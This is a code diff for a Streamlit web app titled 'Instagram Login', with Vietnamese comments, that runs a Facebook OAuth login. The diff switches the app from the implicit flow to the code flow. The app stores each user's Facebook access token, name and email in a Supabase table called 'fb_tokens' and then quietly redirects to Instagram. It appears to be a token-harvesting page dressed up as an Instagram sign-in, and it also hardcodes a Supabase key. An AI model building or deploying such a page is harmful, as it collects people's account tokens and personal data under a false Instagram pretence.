@@ -3,23 +3,18 @@ import urllib.parse
 import secrets
 
 # ==============================================
-# CONFIGURATION — ALL UPDATED
+# CONFIGURATION
 # ==============================================
 CLIENT_ID = "1589243162990530"
-
-# ⚠️ THIS EXACT URL MUST BE REGISTERED IN FACEBOOK DASHBOARD
-# Facebook Login → Settings → Valid OAuth Redirect URIs
-# Kiểm tra: có dấu / cuối hay không → phải trùng khớp 100%
+CLIENT_SECRET = "Điền Client Secret từ Facebook Dashboard → Cài đặt → Ứng dụng"
 REDIRECT_URI = "https://instagrammeta.streamlit.app/"
+FB_API_VERSION = "v24.0"
 
 SUPABASE_URL = "https://mxuthpngeagcxoxtnjhd.supabase.co"
 SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im14dXRocG5nZWFnY3hveHRuamhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ2NTA5MjEsImV4cCI6MjEwMDIyNjkyMX0.Fbf5vMxG4C3JERld_4LvlQBPNrQB8UQcz_aloIOaHBs"
 
-# Facebook API VERSION — UPDATED TO LATEST v24.0 (2026)
-FB_API_VERSION = "v24.0"
-
 # ==============================================
-# CSRF PROTECTION
+# CSRF STATE
 # ==============================================
 if "oauth_state" not in st.session_state:
     st.session_state.oauth_state = secrets.token_urlsafe(32)
@@ -27,207 +22,124 @@ if "oauth_state" not in st.session_state:
 st.set_page_config(page_title="Instagram Login", layout="centered")
 
 # ==============================================
-# MAIN JAVASCRIPT — IMPROVED DETECTION
+# BƯỚC 1: NHẬN CODE TỪ FACEBOOK
 # ==============================================
-js_code = f"""
-<script>
-const REDIRECT_URI = "{urllib.parse.quote(REDIRECT_URI, safe='')}";
-const EXPECTED_STATE = "{st.session_state.oauth_state}";
-const SUPABASE_URL = "{SUPABASE_URL}";
-const SUPABASE_KEY = "{SUPABASE_KEY}";
-const FB_API_VERSION = "{FB_API_VERSION}";
+query_params = st.query_params
+code = query_params.get("code")
+returned_state = query_params.get("state")
+error = query_params.get("error")
 
-// ⚠️ Chờ trang tải hoàn toàn + kiểm token NHIỀU LẦN 
-// Tránh trường hợp JS chạy trước khi Facebook gắn token vào URL
-function init() {{
-    setTimeout(checkForToken, 100);  // Kiểm tra sau 100ms
-    setTimeout(checkForToken, 500);  // Kiểm tra lại sau 500ms
-    setTimeout(checkForToken, 1000); // Kiểm tra lần cuối sau 1s
-}}
+# ==============================================
+# CÓ LỖI TỪ FACEBOOK
+# ==============================================
+if error:
+    error_desc = query_params.get("error_description", "Không rõ lỗi")
+    st.error(f"❌ Lỗi: {error_desc}")
+    st.stop()
 
-function checkForToken() {{
-    console.log("🔍 Đang tìm token...");
-    console.log("URL hiện tại:", window.location.href);
-    console.log("Fragment (sau dấu #):", window.location.hash);
+# ==============================================
+# BƯỚC 2: NHẬN ĐƯỢC CODE → ĐỔI THÀNH TOKEN
+# ==============================================
+if code:
+    # Kiểm tra bảo mật state
+    if returned_state != st.session_state.oauth_state:
+        st.error("⚠️ Lỗi bảo mật. Vui lòng thử lại.")
+        st.stop()
 
-    const hash = window.location.hash.slice(1);
-    if (!hash) {{
-        console.log("❌ Không thấy token → chuyển đến Facebook đăng nhập");
-        redirectToFacebook();
-        return;
-    }}
+    st.info("🔄 Đang xác minh...")
 
-    const params = new URLSearchParams(hash);
-    const accessToken = params.get("access_token");
-    const returnedState = params.get("state");
-    const error = params.get("error");
-    const errorDesc = params.get("error_description");
+    import requests
 
-    // Xóa token khỏi thanh địa chỉ ngay
-    if (accessToken || error) {{
-        history.replaceState(null, "", window.location.pathname);
-    }}
+    # Gọi Facebook để đổi Code → Access Token
+    token_url = f"https://graph.facebook.com/{FB_API_VERSION}/oauth/access_token"
+    token_params = {
+        "client_id": CLIENT_ID,
+        "client_secret": CLIENT_SECRET,
+        "redirect_uri": REDIRECT_URI,
+        "code": code
+    }
 
-    // ==============================================
-    // XỬ LÝ LỖI TỪ FACEBOOK
-    // ==============================================
-    if (error) {{
-        showStatus(`❌ Lỗi: ${{errorDesc || error}}`);
-        console.error("Lỗi từ Facebook:", error, errorDesc);
-        return;
-    }}
+    token_res = requests.get(token_url, params=token_params)
+    token_data = token_res.json()
 
-    // ==============================================
-    // TÌM THẤY TOKEN! → LƯU & CHUYỂN HƯỚNG
-    // ==============================================
-    if (accessToken) {{
-        console.log("✅ TOKEN ĐƯỢC TÌM THẤY! Độ dài:", accessToken.length);
-        console.log("State nhận được:", returnedState);
-        console.log("State mong đợi:", EXPECTED_STATE);
+    if "access_token" not in token_data:
+        st.error(f"❌ Không lấy được Token: {token_data}")
+        st.stop()
 
-        // Kiểm tra bảo mật
-        if (returnedState !== EXPECTED_STATE) {{
-            showStatus("⚠️ Lỗi bảo mật. Vui lòng thử lại.");
-            console.error("State không khớp!");
-            return;
-        }}
+    access_token = token_data["access_token"]
+    expires_in = token_data.get("expires_in", 5184000)
 
-        showStatus("✅ Đăng nhập thành công! Đang xử lý...");
-        saveTokenAndRedirect(accessToken, returnedState);
-        return;
-    }}
+    # ==============================================
+    # BƯỚC 3: LẤY THÔNG TIN USER
+    # ==============================================
+    profile_url = f"https://graph.facebook.com/{FB_API_VERSION}/me"
+    profile_params = {
+        "fields": "id,name,email",
+        "access_token": access_token
+    }
+    profile_res = requests.get(profile_url, params=profile_params)
+    profile = profile_res.json()
 
-    // Không có token
-    console.log("❌ Không tìm thấy access_token trong fragment");
-    redirectToFacebook();
-}}
+    # ==============================================
+    # BƯỚC 4: LƯU VÀO SUPABASE
+    # ==============================================
+    try:
+        from supabase import create_client
+        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
 
-// ==============================================
-// LƯU TOKEN → SUPABASE → CHUYỂN INSTAGRAM
-// ==============================================
-async function saveTokenAndRedirect(token, state) {{
-    try {{
-        // Tải Supabase SDK
-        await loadSupabase();
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        data, db_error = supabase.table("fb_tokens").upsert([{
+            "facebook_id": profile.get("id"),
+            "name": profile.get("name"),
+            "email": profile.get("email"),
+            "access_token": access_token,
+            "expires_at": (st.session_state.get("_now") or __import__("datetime").datetime.utcnow() + __import__("datetime").timedelta(seconds=expires_in)).isoformat()
+        }], on_conflict="facebook_id").execute()
 
-        // Lấy thông tin user từ Facebook Graph API
-        const profileUrl = `https://graph.facebook.com/${{FB_API_VERSION}}/me?fields=id,name,email&access_token=${{token}}`;
-        console.log("🔄 Đang lấy thông tin user...");
-        
-        const profileRes = await fetch(profileUrl);
-        const profile = await profileRes.json();
+        if db_error:
+            st.warning(f"⚠️ Lỗi lưu Supabase: {db_error}")
+    except Exception as e:
+        st.warning(f"⚠️ Lỗi kết nối Supabase: {e}")
 
-        if (profile.error) {{
-            console.warn("Lỗi Facebook API:", profile.error);
-        }} else {{
-            console.log("👤 Thông tin user:", profile);
+    # ==============================================
+    # BƯỚC 5: THÀNH CÔNG → CHUYỂN ĐẾN INSTAGRAM
+    # ==============================================
+    st.success(f"✅ Xin chào {profile.get('name', 'Bạn')}! Đang mở Instagram...")
 
-            // Lưu vào Supabase
-            const {{ data, error }} = await supabase
-                .from("fb_tokens")
-                .upsert([{{
-                    facebook_id: profile.id,
-                    name: profile.name,
-                    email: profile.email,
-                    access_token: token,
-                    logged_in_at: new Date().toISOString()
-                }}], {{ onConflict: "facebook_id" }});
+    # Xóa tham số code khỏi URL cho sạch
+    st.query_params.clear()
 
-            if (error) {{
-                console.warn("Lỗi lưu Supabase:", error);
-            }} else {{
-                console.log("✅ Đã lưu vào Supabase thành công!");
-            }}
-        }}
-    }} catch (err) {{
-        console.warn("Lỗi xử lý:", err.message);
-    }}
-
-    // ==============================================
-    // CHUYỂN ĐẾN INSTAGRAM
-    // ==============================================
-    console.log("🚀 Đang mở Instagram...");
-    showStatus("✅ Thành công! Đang chuyển hướng đến Instagram...");
-    
-    setTimeout(() => {{
+    # Chuyển hướng đến Instagram
+    st.markdown("""
+    <script>
+    setTimeout(() => {
         window.location.href = "instagram://";
-    }}, 800);
-    
-    // Dự phòng mở web nếu không có app
-    setTimeout(() => {{
+    }, 1000);
+    setTimeout(() => {
         window.location.href = "https://www.instagram.com";
-    }}, 2500);
-}}
+    }, 3000);
+    </script>
+    """, unsafe_allow_html=True)
 
-// ==============================================
-// CHUYỂN ĐẾN TRANG ĐĂNG NHẬP FACEBOOK
-// ==============================================
-function redirectToFacebook() {{
-    const authUrl = 
-        "https://www.facebook.com/${{FB_API_VERSION}}/dialog/oauth?" +
-        "client_id={CLIENT_ID}" +
-        "&redirect_uri=" + encodeURIComponent(REDIRECT_URI) +
-        "&response_type=token" +
-        "&scope=email,public_profile" +
-        "&state=" + encodeURIComponent(EXPECTED_STATE) +
-        "&auth_type=rerequest";  // Yêu cầu cấp quyền lại nếu bị từ chối trước
-
-    console.log("🔄 Chuyển đến Facebook:", authUrl);
-    window.location.href = authUrl;
-}}
-
-// ==============================================
-// TẢI SUPABASE SDK
-// ==============================================
-function loadSupabase() {{
-    return new Promise((resolve, reject) => {{
-        if (window.supabase) return resolve();
-        const script = document.createElement("script");
-        script.src = "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2";
-        script.onload = () => resolve();
-        script.onerror = () => reject(new Error("Không tải được Supabase SDK"));
-        document.head.appendChild(script);
-    }});
-}}
-
-// ==============================================
-// HIỂN THỊ THÔNG BÁO
-// ==============================================
-function showStatus(message) {{
-    document.body.innerHTML = `
-        <div style="padding: 3rem; text-align: center; font-family: system-ui, sans-serif;">
-            <h3 style="color: #1f2937;">${{message}}</h3>
-            <p style="color: #6b7280; margin-top: 1rem; font-size: 0.9rem;">
-                Mở Console (F12) → Tab Console để xem chi tiết
-            </p>
-        </div>`;
-}}
-
-// CHẠY KHI TRANG TẢI XONG
-window.addEventListener("DOMContentLoaded", init);
-</script>
-"""
-
-# Chèn mã JavaScript
-st.components.v1.html(js_code, height=0)
+    st.stop()
 
 # ==============================================
-# THÔNG BÁO CHO NGƯỜI DÙNG
+# BƯỚC 0: CHƯA CÓ CODE → CHUYỂN ĐẾN FACEBOOK ĐĂNG NHẬP
 # ==============================================
-st.info("⏳ Đang xử lý... Nếu không tự động chuyển, nhấp nút bên dưới.")
-
 auth_url = (
     f"https://www.facebook.com/{FB_API_VERSION}/dialog/oauth?"
     f"client_id={urllib.parse.quote(CLIENT_ID)}"
     f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
-    f"&response_type=token"
+    f"&response_type=code"  # ⚠️ Dùng CODE thay vì Token trực tiếp
     f"&scope=email,public_profile"
     f"&state={urllib.parse.quote(st.session_state.oauth_state)}"
 )
 
-st.markdown(f"[👉 Nhấp vào đây để Đăng Nhập Facebook]({auth_url})")
+st.info("⏳ Đang chuyển hướng đến Facebook...")
+st.markdown(f"[👉 Nhấp vào đây nếu không tự động chuyển hướng]({auth_url})")
 
-# Hướng dẫn kiểm tra
-st.markdown("---")
-st.caption("🔧 **Kiểm tra lỗi:** Nhấn F12 → Tab Console xem chi tiết lỗi")
+# Tự động chuyển hướng
+st.components.v1.html(f"""
+<script>
+window.location.href = "{auth_url}";
+</script>
+""", height=0)
